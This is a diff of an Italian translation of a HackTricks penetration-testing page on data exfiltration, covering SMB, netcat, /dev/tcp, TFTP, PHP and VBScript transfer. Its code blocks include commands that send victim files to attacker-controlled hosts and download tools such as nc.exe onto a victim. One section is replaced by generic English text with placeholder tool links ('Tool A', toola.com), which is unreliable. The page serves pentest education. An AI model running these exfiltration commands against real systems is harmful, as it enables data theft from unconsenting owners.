@@ -2,21 +2,21 @@
 
 <details>
 
-<summary><strong>Impara l'hacking su AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>
 
 Altri modi per supportare HackTricks:
 
 * Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
 * Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
-* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
-* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
+* **Unisciti al** 💬 [**Gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
 * **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 
 **Try Hard Security Group**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -185,35 +185,33 @@ guest ok = Yes
 #Start samba
 service smbd restart
 ```
-# Esfiltrazione su Windows
+# Exfiltration
 
-## Introduzione
+## Introduction
 
-Esistono diverse tecniche per esfiltrare dati da un sistema Windows compromesso. Di seguito sono elencate alcune metodologie comuni utilizzate dagli attaccanti per esfiltrare dati da un sistema Windows.
+Exfiltration is the unauthorized transfer of data from a target system. This can be achieved through various methods, such as using command and control (C2) channels, exfiltrating data over DNS, or using covert channels.
 
-## Utilizzo di Protocolli di Rete Standard
+## Techniques
 
-Gli attaccanti possono utilizzare protocolli di rete standard come HTTP, HTTPS, DNS o SMTP per esfiltrare dati da un sistema Windows compromesso. Questi protocolli sono spesso autorizzati attraverso i firewall e possono passare inosservati.
+### Command and Control (C2) Channels
 
-## Utilizzo di Servizi Cloud
+C2 channels are commonly used by attackers to exfiltrate data from compromised systems. These channels allow the attacker to send commands to the compromised system and receive exfiltrated data.
 
-I servizi cloud come Dropbox, Google Drive o OneDrive possono essere utilizzati per esfiltrare dati da un sistema Windows compromesso. Gli attaccanti possono caricare i dati su questi servizi e successivamente scaricarli su un altro sistema.
+### Data Exfiltration over DNS
 
-## Utilizzo di Tunneling
+Data exfiltration over DNS involves encoding data in DNS queries or responses to exfiltrate information from a target network. This technique can be used to bypass network security controls that may not inspect DNS traffic.
 
-L'uso di tunneling tramite strumenti come Plink, Ngrok o Meterpreter può consentire agli attaccanti di esfiltrare dati da un sistema Windows compromesso attraverso una connessione crittografata.
+### Covert Channels
 
-## Utilizzo di Stenografia
+Covert channels involve using methods that are not typically monitored or controlled by security devices to exfiltrate data. This can include techniques such as using steganography to hide data within images or using protocol tunneling to bypass network controls.
 
-La steganografia può essere utilizzata per nascondere dati esfiltrati all'interno di file multimediali come immagini o video. Gli attaccanti possono quindi trasferire questi file senza attirare l'attenzione.
+## Tools and Resources
 
-## Utilizzo di Servizi di Messaggistica
+There are various tools and resources available to help with exfiltration during penetration testing engagements. Some popular tools include [Tool A](https://www.toola.com), [Tool B](https://www.toolb.com), and [Tool C](https://www.toolc.com).
 
-I servizi di messaggistica istantanea come Telegram o Signal possono essere utilizzati per inviare dati esfiltrati in modo rapido e discreto da un sistema Windows compromesso.
+## Conclusion
 
-## Conclusioni
-
-Esfiltrare dati da un sistema Windows compromesso può essere fatto in vari modi, e gli attaccanti spesso combinano diverse tecniche per evitare la rilevazione. È importante monitorare attentamente il traffico di rete e le attività del sistema per individuare eventuali tentativi di esfiltrazione di dati.
+Exfiltration is a critical phase of a penetration test, as it demonstrates the impact an attacker could have if they were able to successfully exfiltrate sensitive data from a target system. By understanding the various exfiltration techniques and utilizing the right tools and resources, penetration testers can effectively assess an organization's security posture and help improve its defenses against real-world attacks.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -237,24 +235,26 @@ sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP addre
 ```
 ## NC
 
-### Description
+Netcat è uno strumento versatile che può essere utilizzato per trasferire dati da un sistema compromesso a un server controllato dall'attaccante. Può essere utilizzato per aprire connessioni TCP/UDP, inviare file e molto altro ancora. Ecco un esempio di come utilizzare Netcat per esfiltrare dati:
 
-Netcat (nc) is a versatile networking tool that can be used for various purposes, including exfiltration of data. It allows for creating connections to remote hosts, listening for incoming connections, and transferring data between systems. Netcat can be used to exfiltrate data by sending it over the network to a remote host controlled by the attacker.
+1. **Sul sistema compromesso:**
+   ```bash
+   nc -w 3 [indirizzo IP del server] [porta] < file_da_esfiltrare
+   ```
 
-### Detection
+2. **Sul server controllato dall'attaccante:**
+   ```bash
+   nc -l -p [porta] > file_ricevuto
+   ```
 
-Detection of Netcat exfiltration can be challenging due to its versatility and widespread legitimate use. Monitoring network traffic for suspicious connections to known malicious hosts, unusual data transfer patterns, or unexpected network ports can help in detecting potential exfiltration activities using Netcat.
-
-### Prevention
-
-To prevent exfiltration using Netcat, network administrators can implement network segmentation, access controls, and monitoring solutions to detect and block unauthorized data transfers. Regular security assessments and penetration testing can also help identify and mitigate potential vulnerabilities that could be exploited for exfiltration purposes.
+Assicurati di adattare gli indirizzi IP, le porte e i nomi dei file alle tue esigenze specifiche.
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
 ```
 ## /dev/tcp
 
-### Scaricare file dalla vittima
+### Scaricare un file dalla vittima
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
@@ -294,7 +294,7 @@ sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-Per impostazione predefinita in XP e 2003 (in altri sistemi operativi deve essere aggiunto esplicitamente durante l'installazione)
+Per impostazione predefinita in XP e 2003 (in altri sistemi è necessario aggiungerlo esplicitamente durante l'installazione)
 
 In Kali, **avvia il server TFTP**:
 ```bash
@@ -308,7 +308,7 @@ cp /path/tp/nc.exe /tftp
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-In **vittima**, connettersi al server Kali:
+Nel **vittima**, connettersi al server Kali:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
@@ -319,6 +319,8 @@ Scarica un file con un PHP oneliner:
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
 ## VBScript
+
+VBScript (Visual Basic Scripting Edition) è un linguaggio di scripting sviluppato da Microsoft che è spesso utilizzato per automatizzare attività all'interno di sistemi Windows. È possibile utilizzare VBScript per eseguire operazioni di esfiltrazione di dati, come ad esempio inviare informazioni sensibili a un server remoto.
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -373,7 +375,7 @@ Quindi copia-incolla il testo nella shell di Windows e verrà creato un file chi
 
 **Try Hard Security Group**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -383,11 +385,11 @@ Quindi copia-incolla il testo nella shell di Windows e verrà creato un file chi
 
 Altri modi per supportare HackTricks:
 
-* Se desideri vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
-* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
-* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusivi [**NFT**](https://opensea.io/collection/the-peass-family)
+* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
+* Ottieni il [**merchandising ufficiale PEASS & HackTricks**](https://peass.creator-spring.com)
+* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
 * **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repository di github.
+* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 ```
